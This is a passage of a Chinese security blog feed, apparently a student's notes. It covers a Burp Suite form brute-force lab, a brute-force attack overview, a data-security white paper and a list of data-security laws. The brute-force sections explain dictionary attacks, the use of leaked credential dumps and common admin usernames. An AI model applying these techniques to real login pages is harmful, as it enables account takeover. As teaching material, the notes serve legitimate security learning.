src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.png"></p><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.png" alt="6"></p><h4 id="7-开始字典攻击"><a href="#7-开始字典攻击" class="headerlink" title="7.开始字典攻击"></a>7.开始字典攻击</h4><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.png"></p><p>&emsp;&emsp;然后单击length可以看到一个长度比较小的，因为密码错误（username or password is not exists）和密码正确（login success）所弹出的字符串长度不一样，所以可以根据返回页面的长度来判断是否成功。</p><h4 id="8-查看对应response里的内容"><a href="#8-查看对应response里的内容" class="headerlink" title="8.查看对应response里的内容"></a>8.查看对应response里的内容</h4><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.png"></p><p>&emsp;&emsp;可以看见显示爆破成功。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据安全白皮书笔记</title>
    <link href="/2022/07/28/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%BA%8C/"/>
    <url>/2022/07/28/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="数据安全白皮书笔记"><a href="#数据安全白皮书笔记" class="headerlink" title="数据安全白皮书笔记"></a>数据安全白皮书笔记</h1><h3 id="第一章-数据安全形式"><a href="#第一章-数据安全形式" class="headerlink" title="第一章   数据安全形式"></a>第一章   数据安全形式</h3><h4 id="1-1-数据价值"><a href="#1-1-数据价值" class="headerlink" title="1.1  数据价值"></a>1.1  数据价值</h4><p>&emsp;&emsp;数据的重要性：</p><ul><li>数据是数字经济时代的核心生产要素。</li><li>通过法律法规限定达到数据安全合规要求</li></ul><p>&emsp;&emsp;数据利用与数据安全的平衡兼顾存在问题</p><ul><li>对数据资产识别不完整</li><li>数据流动路径无法溯源</li><li>安全与业务难以兼顾</li><li>等</li></ul><h5 id="1-1-1-我国数据发展战略"><a href="#1-1-1-我国数据发展战略" class="headerlink" title="1.1.1 我国数据发展战略"></a>1.1.1 我国数据发展战略</h5><ul><li>2015年8月《促进大数据发展行动纲要》：数据为国家基础性战略资源。</li><li>2016年11月《网络安全法》：鼓励开发网络数据安全保护和利用技术。</li><li>2016年12月《国家网络空间安全战略》：实施国家大数据战略，建立大数据安全管理制度、支持大数据信息技术创新和应用要求。</li><li>2020年4月《关于构建更加完善的要素市场化配制体制机制的意见》：数据与土地、劳动力、资本、技术并称为五种要素。</li><li>2020年5月《关于新时代加快完善社会主义市场经济体制的意见》：加快培育发展数据要素市场。</li><li>2020年10月《中共中央关于制定国民经济和社会发展第十四个五年规划和二O三五年远景目标的建议》</li><li>2021年10月《关于加快推进中央企业两化融合和数字化转型战略合作协议》：推动中央企业加快信息化工业化融合和数字化转型，促进数字技术与实体经济深度融合。</li><li>2021年11月《“十四五”大数据创业发展规划》：加快培育数据要素市场、发挥大数据特性优势、筑牢数据安全保证防线。</li><li>2021年12月《“十四五”国家信息规划》：数据要素是社会生产经营活动，带来经济效益，一电子方式记录的数据资源，是国家发展的战略性基础性资源，是驱动数字经济发展的强大动力。</li><li>2022年1月《“十四五”数字经济发展规划》：充分发挥数据要素作用，必须清华高质量数据要素供给、加快数据要素市场流通、创新数据要素开发利用机制。</li><li>2022年3月《国务院总理李克强政府工作报告》：强化网络安全、数据安全和个人信息保护。</li></ul><h5 id="1-1-2-国外数据发展战略"><a href="#1-1-2-国外数据发展战略" class="headerlink" title="1.1.2 国外数据发展战略"></a>1.1.2 国外数据发展战略</h5><ul><li>美国：率先启动，将大数据上升为国家战略</li><li>欧盟：战略目标是确保成为数据世界的榜样和领导者，建立了完善的法律框架</li></ul><h4 id="1-2-数据安全风险形式"><a href="#1-2-数据安全风险形式" class="headerlink" title="1.2 数据安全风险形式"></a>1.2 数据安全风险形式</h4><h5 id="1-2-1-外部数据安全威胁"><a href="#1-2-1-外部数据安全威胁" class="headerlink" title="1.2.1  外部数据安全威胁"></a>1.2.1  外部数据安全威胁</h5><p>1）数据窃取：</p><ul><li>通过向软件中植入木马窃取数据</li><li>盗用特权账户导致数据泄露</li><li>数据委托处理时被合作方盗用数据</li><li>关联利用已泄露数据发动撞库攻击</li><li>APT高级可持续威胁攻击窃取组织核心机密</li></ul><p>2）数据篡改</p><ul><li>用勒索病毒加密数据敲诈赎金</li><li>利用区块链漏洞攻击智能合约</li></ul><p>3）数据非法使用</p><ul><li>利用网络爬虫抓取和分析隐私数据</li></ul><h5 id="1-2-2-内部数据的安全风险"><a href="#1-2-2-内部数据的安全风险" class="headerlink" title="1.2.2 内部数据的安全风险"></a>1.2.2 内部数据的安全风险</h5><p>1）内部人员有意或无意行为引发的数据安全风险</p><ul><li>数据泄露：<ol><li>越权访问攻击</li><li>数据跨境自由流动</li></ol></li><li>数据窃取<ol><li>内部人员窃取</li><li>员工亲友冒用身份</li><li>研发人员放置后门</li></ol></li><li>数据篡改<ol><li>业务人员违规篡改</li><li>研究人员放置后门</li><li>运维人员为泄愤恶意破坏</li><li>数据意外丢失</li></ol></li></ul><p>2）敏感个人信息非法利用严重侵害个人权益</p><ul><li>敏感个人信息过度手机对个人权益照成巨大损害</li><li>大数据杀熟严重侵害消费者权益</li><li>业务频繁变化引用的数据误用和滥用</li></ul><h5 id="1-2-3-数据安全事件危害性"><a href="#1-2-3-数据安全事件危害性" class="headerlink" title="1.2.3 数据安全事件危害性"></a>1.2.3 数据安全事件危害性</h5><p>1）危害长度日益加剧</p><p>2）影响范围不断扩大</p><h4 id="1-3-监管新措施"><a href="#1-3-监管新措施" class="headerlink" title="1.3 监管新措施"></a>1.3 监管新措施</h4><p>1）国家层面：</p><ul><li>2021年6月  《数据安全法》</li><li>2021年8月  《个人信息保护法》</li><li>2021年11月  《网络数据安全管理条例》</li></ul><p>2）行业层面：</p><ul><li>2020年5月  《银行业金融机构数据治理指引》</li><li>2021年1月  《中国银保监会管数据安全管理办法》</li><li>2021年9月  《工业和信息化领域数据阿全管理办法》</li><li>2022年1月  《金融科技发展规划》</li></ul><p>3）地方层面：</p><ul><li>2018年6月    《贵阳市大数据安全管理条例》</li><li>2018年12月  《天津市促进大数据发展应用条例》</li><li>2021年7月     《深圳经济特区数据条例》</li><li>2021年11月    《上海市数据条例》</li><li>2021年12月    《江苏省公共数据管理办法》</li><li>2022年1月       《浙江省公共数据条例》</li><li>2022年1月       《山东省公共数据开放办法》</li></ul><h3 id="第二章：管理层面"><a href="#第二章：管理层面" class="headerlink" title="第二章：管理层面"></a>第二章：管理层面</h3><h4 id="2-1-管理层面"><a href="#2-1-管理层面" class="headerlink" title="2.1 管理层面"></a>2.1 管理层面</h4><h5 id="2-1-1-多法并轨、多标准并行下缺乏一致性的合规治理手段"><a href="#2-1-1-多法并轨、多标准并行下缺乏一致性的合规治理手段" class="headerlink" title="2.1.1 多法并轨、多标准并行下缺乏一致性的合规治理手段"></a>2.1.1 多法并轨、多标准并行下缺乏一致性的合规治理手段</h5><ul><li>痛点：“三法三条例”</li><li>需求</li></ul><h3 id="第四章-法律法规标准解读"><a href="#第四章-法律法规标准解读" class="headerlink" title="第四章   法律法规标准解读"></a>第四章   法律法规标准解读</h3><h4 id="4-1-国内法律法规与行业标准解读"><a href="#4-1-国内法律法规与行业标准解读" class="headerlink" title="4.1 国内法律法规与行业标准解读"></a>4.1 国内法律法规与行业标准解读</h4><h5 id="4-1-1-法律"><a href="#4-1-1-法律" class="headerlink" title="4.1.1 法律"></a>4.1.1 法律</h5><p>&emsp;1）《网络安全法》保障网络与信息安全</p><p>&emsp;&emsp;全面地规定网络与信息安全治理的基本规则，以网络运营者及关键信息基础设施运营者为主要规制对象，明确网络运行安全，网络信息安全、监测预警与应急处置等方面的义务。</p><ul><li>保证网络运行安全</li><li>保障网络用户信息安全</li><li>保障网络数据安全</li></ul><p>&emsp;2）《数据安全法》构建数据安全治理框架</p><ul><li>数据开放利用与数据安全并重</li><li>构建数据安全制度体系</li><li>实施全生命周期的数据安全保护</li><li>推进政务数据的安全与开放</li></ul><p>&emsp;3）《个人信息保护法》保证个人信息全生命周期处理的安全</p><ul><li>个人信息全生命周期处理的防护</li><li>明确个人信息处理者所应采取的组织措施及技术措施</li><li>赋予个人充分的个人信息权益</li></ul><h5 id="4-1-2-行政法规"><a href="#4-1-2-行政法规" class="headerlink" title="4.1.2 行政法规"></a>4.1.2 行政法规</h5><p>&emsp;1）《关键信息基础设施安全保护条例》实施关键信息基础设施重点保护</p><ul><li>重点防范关键信息基础设施风险</li><li>重点强调对数据安全的保护</li></ul><p>&emsp;2）《网络数据安全管理条例》细化数据安全治理规则</p><h5 id="4-1-3-部门规章及规范性文件"><a href="#4-1-3-部门规章及规范性文件" class="headerlink" title="4.1.3 部门规章及规范性文件"></a>4.1.3 部门规章及规范性文件</h5><p>&emsp;1）各行业各部门数据安全的协同治理</p><p>&emsp;2）数据安全治理领域的重要规范</p><ul><li>整体要求</li><li>金融领域</li><li>工业和互联网</li></ul><h5 id="4-1-4-地方性法规"><a href="#4-1-4-地方性法规" class="headerlink" title="4.1.4 地方性法规"></a>4.1.4 地方性法规</h5><p>&emsp;1）创新数据安全治理新模式</p><p>&emsp;2）提供公共数据治理的模式借鉴</p><h5 id="4-1-5-国家标准、行业标准及相关指南"><a href="#4-1-5-国家标准、行业标准及相关指南" class="headerlink" title="4.1.5 国家标准、行业标准及相关指南"></a>4.1.5 国家标准、行业标准及相关指南</h5><h4 id="4-2-国际数据拿权政策与法规概述"><a href="#4-2-国际数据拿权政策与法规概述" class="headerlink" title="4.2 国际数据拿权政策与法规概述"></a>4.2 国际数据拿权政策与法规概述</h4><h5 id="4-2-1-欧洲的政策和法律"><a href="#4-2-1-欧洲的政策和法律" class="headerlink" title="4.2.1 欧洲的政策和法律"></a>4.2.1 欧洲的政策和法律</h5><p>&emsp;1）欧盟</p><ul><li>《通用数据保护条例》</li><li>《网络信息系统安全指令》</li></ul><p>&emsp;2）法国</p><ul><li>《第78-17号法案》</li></ul><p>&emsp;3）德国</p><ul><li>《联邦数据安全法》</li></ul><p>&emsp;4）英国</p><ul><li>《英国GDPR》</li></ul><p>&emsp;5）俄罗斯</p><ul><li>《242-FZ（12.31.2014）》</li></ul><h5 id="4-2-2-美国的政策和法律"><a href="#4-2-2-美国的政策和法律" class="headerlink" title="4.2.2 美国的政策和法律"></a>4.2.2 美国的政策和法律</h5><p>&emsp;1）联邦</p><p>&emsp;2）州</p><h5 id="4-2-3-其他国家的政策和法律"><a href="#4-2-3-其他国家的政策和法律" class="headerlink" title="4.2.3 其他国家的政策和法律"></a>4.2.3 其他国家的政策和法律</h5><p>&emsp;1）澳大利亚</p><ul><li>信息安全注册评估</li></ul><p>&emsp;2）日本</p><ul><li>《个人信息保护法》</li></ul><p>&emsp;3）阿根廷</p><ul><li>《个人数据保护法》</li></ul>]]></content>
    
    
    <categories>
      
      <category>五所实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>暴力破解概述</title>
    <link href="/2022/07/28/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%A6%82%E8%BF%B0/"/>
    <url>/2022/07/28/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="暴力破解概述"><a href="#暴力破解概述" class="headerlink" title="暴力破解概述"></a>暴力破解概述</h1><h4 id="1-概述："><a href="#1-概述：" class="headerlink" title="1.概述："></a>1.概述：</h4><p>&emsp;&emsp;“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间。</p><h4 id="2-对象："><a href="#2-对象：" class="headerlink" title="2.对象："></a>2.对象：</h4><p>&emsp;&emsp;需要账号密码登录的端口</p><h4 id="3-组成："><a href="#3-组成：" class="headerlink" title="3.组成："></a>3.组成：</h4><p>&emsp;&emsp;连续性尝试+字典+自动化</p><h4 id="4-字典来源："><a href="#4-字典来源：" class="headerlink" title="4.字典来源："></a>4.字典来源：</h4><ul><li>常用的账号密码（弱口令）</li><li>互联网上被脱库后的账号密码（譬如当初csdn泄露的600w用户信息，也就是所谓的撞库）</li><li>使用特定的字符使用工具按照指定的规则进行排列组合算法生成不同的密码</li></ul><p>&emsp;&emsp;（提示：作为渗透人员，一定要多保留一些字典）</p><p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%A6%82%E8%BF%B0/2.jpg"></p><h4 id="5-暴力破解漏洞："><a href="#5-暴力破解漏洞：" class="headerlink" title="5.暴力破解漏洞："></a>5.暴力破解漏洞：</h4><p>&emsp;&emsp;如果一个网站没有对登录接口实施暴力破解的措施，或者实施了不合理的措施，则称该网站存在暴力破解漏洞。</p><h4 id="6-漏洞判断标准："><a href="#6-漏洞判断标准：" class="headerlink" title="6.漏洞判断标准："></a>6.漏洞判断标准：</h4><ul><li>是否要求用户设置了复杂的密码；</li><li>是否每次认证都使用了安全的验证码；</li><li>是否对尝试登录的行为进行判断和限制；</li><li>是否在必要的情况下采用了双因素认证；</li><li>等等</li></ul><h4 id="7-暴力破解漏洞测试流程："><a href="#7-暴力破解漏洞测试流程：" class="headerlink" title="7.暴力破解漏洞测试流程："></a>7.暴力破解漏洞测试流程：</h4><ol><li><p>确认登录端口的脆弱性</p><p>​        可以通过登录抓包的形式，观察验证元素和response信息等，判断是否存在被暴力破解的可能</p></li><li><p>对字典进行优化</p><p>​        根据实际情况选择不同的字典并对字典进行优化，提高爆破过程的效率。优化技巧：</p><ul><li>技巧一：根据注册提示信息进行优化，对目标站点进行注册，了解账号密码的限制条件，通过限制条件对字典进行相关优化</li><li>技巧二：如果爆破的是管理后台，往往这类系统的管理员是admin/administrator/root的可能性较高。，可以使用这三个账号+随机的密码进行登录尝试，并且根据反馈的结果确定用户名。譬如当返回“用户名或密码错误”时，则需要修改用户名和密码，若仅返回“密码错误”则基本可以确定用户名的准确性</li></ul></li><li><p>工具自动化操作</p><p>​        配置自动化工具（通过现成、超时时间、重复次数等），实现自动化爆破操作</p></li></ol><h4 id="8-Burp暴力破解板块（intruder）功能："><a href="#8-Burp暴力破解板块（intruder）功能：" class="headerlink" title="8.Burp暴力破解板块（intruder）功能："></a>8.Burp暴力破解板块（intruder）功能：</h4><ol><li>target：<ul><li>设置攻击目标，可以通过proxy发送</li></ul></li><li>pasition：<ul><li>niper（单字典，单position替换尝试）</li><li>Battering ram（单字典，多个Position同个秘钥尝试）</li><li>Pitchfork（多个字典，同序号进行替换）</li><li>Cluster bomb（多字典，多行对应多行的尝试）</li></ul></li><li>payloads：<ul><li>设置字典，并可以对字典进行统一的策略处理</li></ul></li><li>options：<ul><li>对扫描的线程、失败重试等进行配置</li><li>对结果设置设置匹配的flag：通过一个标识符来区别结果，并在结果栏中flag出来</li></ul></li></ol><p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%A6%82%E8%BF%B0/1.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据安全法律法规梳理</title>
    <link href="/2022/07/27/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%B8%80/"/>
    <url>/2022/07/27/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="数据安全法律法规梳理"><a href="#数据安全法律法规梳理" class="headerlink" title="数据安全法律法规梳理"></a>数据安全法律法规梳理</h1><h4 id="1-国家层面："><a href="#1-国家层面：" class="headerlink" title="1.国家层面："></a>1.国家层面：</h4><ul><li><p><input disabled="" type="checkbox"> </p><h5 id="《网络安全法》"><a href="#《网络安全法》" class="headerlink" title="《网络安全法》"></a>《网络安全法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2016年11月7</span>日  <br><br>行业属性：全行业<br><br>有关概述：鼓励开发网络数据安全保护和利用技术。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《数据安全法》"><a href="#《数据安全法》" class="headerlink" title="《数据安全法》"></a>《数据安全法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年6月10</span>日  <br><br>行业属性：全行业<br><br>有关概述：数据安全领域的基础性法律<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《个人信息保护法》"><a href="#《个人信息保护法》" class="headerlink" title="《个人信息保护法》"></a>《个人信息保护法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年8月20</span>日  <br><br>行业属性：全行业<br><br>有关概述：保护个人信息权益，规范个人信息处理，促进个人信息利用<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《关键信息基础设施安全保护条例》"><a href="#《关键信息基础设施安全保护条例》" class="headerlink" title="《关键信息基础设施安全保护条例》"></a>《关键信息基础设施安全保护条例》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间<span class="hljs-number">2017年7月10</span>日<br><br>行业属性：全行业<br><br>有关概述：专门安全管理机构具体负责本单位的关键信息基础设施安全保护工作，履行个人信息和数据安全保护责任，建立健全个人信息和数据安全保护制度。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《征信业管理条例》"><a href="#《征信业管理条例》" class="headerlink" title="《征信业管理条例》"></a>《征信业管理条例》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2013年3月15</span><br><br>行业时间：全行业（针对征信方面的数据）<br><br>有关概述：征信机构按照规定，建立保证信息安全的规章制度，采取有效技术保证信息安全<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《关于运用大数据加强对市场主体服务和监管的若干意见》"><a href="#《关于运用大数据加强对市场主体服务和监管的若干意见》" class="headerlink" title="《关于运用大数据加强对市场主体服务和监管的若干意见》"></a>《关于运用大数据加强对市场主体服务和监管的若干意见》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2015年7月1</span>日<br><br>行业属性：全行业<br><br>有关概述：加强对涉及国家安全重要数据的管理，加强对大数据相关技术、设备和服务提供商的风险评估和安全管理。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《关于积极推进“互联网-”行动的指导意见》"><a href="#《关于积极推进“互联网-”行动的指导意见》" class="headerlink" title="《关于积极推进“互联网+”行动的指导意见》"></a>《关于积极推进“互联网+”行动的指导意见》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2015年7月4</span><br><br>行业属性：全行业（针对互联网传输的数据）<br><br>有关概述：完善网络数据共享、利用等的安全管理和措施。探索数据安全流动认证体系，完善数据跨境流动管理制度，确保数据安全<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《商用密码管理条例》"><a href="#《商用密码管理条例》" class="headerlink" title="《商用密码管理条例》"></a>《商用密码管理条例》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">1999年10月7</span>日<br><br>行业属性：全行业<br><br>有关概述：加强商用密码管理，保护信息安全（包括数据概念的安全）<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《密码法》"><a href="#《密码法》" class="headerlink" title="《密码法》"></a>《密码法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2020年1月1</span>日<br><br>行业属性：全行业<br><br>有关概述：规定公民、法人和其他组织依法使用商用密码保护网络与数据安全<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《互联网信息服务管理办法》"><a href="#《互联网信息服务管理办法》" class="headerlink" title="《互联网信息服务管理办法》"></a>《互联网信息服务管理办法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2000年9月25</span>日<br><br>行业属性：全行业（针对互联网传输的数据）<br><br>有关概述：从事经营性互联网信息服务，应当有健全的网络与信息安全保障措施，包括网站安全保障措施、信息安全保密管理制度、用户信息安全管理制度。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《互联网信息服务管理办法（修订草案征求意见稿）》"><a href="#《互联网信息服务管理办法（修订草案征求意见稿）》" class="headerlink" title="《互联网信息服务管理办法（修订草案征求意见稿）》"></a>《互联网信息服务管理办法（修订草案征求意见稿）》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年1月8</span>日<br><br>行业属性：全行业（针对互联网传输的数据）<br><br>有关概述：互联网信息服务提供者、互联网网络接入服务提供者及其工作人员确保其收集的个人信息安全，防止所收集、使用的身份信息、日志信息泄露、毁损、丢失。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《建设高标准市场体系行动方案》"><a href="#《建设高标准市场体系行动方案》" class="headerlink" title="《建设高标准市场体系行动方案》"></a>《建设高标准市场体系行动方案》</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">发布时间：<span class="hljs-number">2021</span>年<span class="hljs-number">1</span>月<span class="hljs-number">31</span>日<br><br>行业属性：全行业<br><br>有关概述<span class="hljs-comment">; 加快培育发展数据要素市场。制定出台新一批数据共享责任清单，加强地区间、部门间数据共享交换。</span><br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《互联网用户公众账号信息服务管理规定》"><a href="#《互联网用户公众账号信息服务管理规定》" class="headerlink" title="《互联网用户公众账号信息服务管理规定》"></a>《互联网用户公众账号信息服务管理规定》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年2月22</span>日<br><br>行业属性：全行业（针对互联网传输的数据）<br><br>有关概述：公众账号信息服务平台要履行企业主体责任，建立公众账号分级分类管理、生态治理、著作权保护、信用评价等制度，切实维护平台内容安全、账号安全、数据安全和个人信息安全。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《2021年政府工作报告》"><a href="#《2021年政府工作报告》" class="headerlink" title="《2021年政府工作报告》"></a>《2021年政府工作报告》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年3月5</span>日<br><br>行业有关概述：全行业（有提高政府建设水平）<br><br>有关概述：加快是数字化发展，打造数字经济优势，协同推进数字产业化和产业数字化转型。强调加强网络安全、数据安全和个人信息保护。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《国民经济和社会发展地十四个五年规划和2035年远景目标纲要》"><a href="#《国民经济和社会发展地十四个五年规划和2035年远景目标纲要》" class="headerlink" title="《国民经济和社会发展地十四个五年规划和2035年远景目标纲要》"></a>《国民经济和社会发展地十四个五年规划和2035年远景目标纲要》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年3月12</span>日<br><br>行业属性：全行业<br><br>有关概述：提高数字政府建设水平，建立健全数据要素市场规则，加强网络安全保护，推动构建网络空间命运共同体。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《反间谍安全防范工作规定》"><a href="#《反间谍安全防范工作规定》" class="headerlink" title="《反间谍安全防范工作规定》"></a>《反间谍安全防范工作规定》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年4月26</span>日<br><br>行业属性：全行业<br><br>有关概述：采取反间谍技术安全防范措施，防范、制止境外网络攻击、网络入侵、网络窃密等间谍行为，保障网络和信息核心技术、关键基础设施和重要领域信息系统及数据的安全。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《常见类型移动互联网应用程序必要个人信息范围规定》"><a href="#《常见类型移动互联网应用程序必要个人信息范围规定》" class="headerlink" title="《常见类型移动互联网应用程序必要个人信息范围规定》"></a>《常见类型移动互联网应用程序必要个人信息范围规定》</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">发布时间：2021年5月1日<br><br>行业属性：全行业（针对互联网传输的数据）<br><br>有关概述：规定明确了39种常见类型<span class="hljs-keyword">App</span>的必要个人信息范围，其中13类<span class="hljs-keyword">App</span>无须个人信息，即可使用基本功能服务。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《全国人民代表大会常务委员会工作报告》"><a href="#《全国人民代表大会常务委员会工作报告》" class="headerlink" title="《全国人民代表大会常务委员会工作报告》"></a>《全国人民代表大会常务委员会工作报告》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年3月8</span>日<br><br>行业属性：全行业<br><br>有关概述：加强个人信息保护，维护数据安全。在<span class="hljs-number">2021</span>年工作安排中指出，全面加强知识产权司法保护，加强知识产权法院建设，加大对“卡脖子”关键核心技术及新兴产业、重点领域、种源等保护力度，服务科技自立自强，服务科技强国建设<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《全国人大常委会2021年度工作要点》"><a href="#《全国人大常委会2021年度工作要点》" class="headerlink" title="《全国人大常委会2021年度工作要点》"></a>《全国人大常委会2021年度工作要点》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年5月14</span>日<br><br>行业属性：全行业<br><br>有关概述：健全现代化经济体系法律制度，制定数据安全法；加强民生保障、社会治理领域立法，制定个人信息保护法。健全国家安全法治体系。<br></code></pre></td></tr></table></figure></li><li><p><input 